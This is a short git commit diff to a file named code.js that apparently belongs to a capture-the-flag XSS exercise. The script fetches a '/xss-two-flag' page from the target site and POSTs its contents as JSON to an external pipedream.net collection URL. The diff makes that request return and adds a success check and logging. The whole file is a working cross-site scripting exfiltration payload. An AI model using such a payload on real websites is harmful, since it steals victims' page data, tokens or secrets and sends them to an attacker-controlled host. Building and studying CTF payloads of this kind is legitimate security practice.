99953f5d7e3c101b5a83e9104328f102b15a9ec9
mrx-arafat <arafatmrx@gmail.com>
2024-05-04 14:02:41 +0600

    fd

--- code.js
+++ code.js
@@ -6,13 +6,19 @@ fetch("/xss-two-flag")
     return response.text();
   })
   .then((flag) => {
-    fetch("https://eopy32tj4ls4imx.m.pipedream.net", {
+    return fetch("https://eopy32tj4ls4imx.m.pipedream.net", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({ flag: flag }), // Send the flag in JSON format
     });
+  })
+  .then((response) => {
+    if (!response.ok) {
+      throw new Error("Failed to send flag to server");
+    }
+    console.log("Flag sent successfully");
   })
   .catch((error) => {
     console.error("Error:", error); // Log any errors to the console
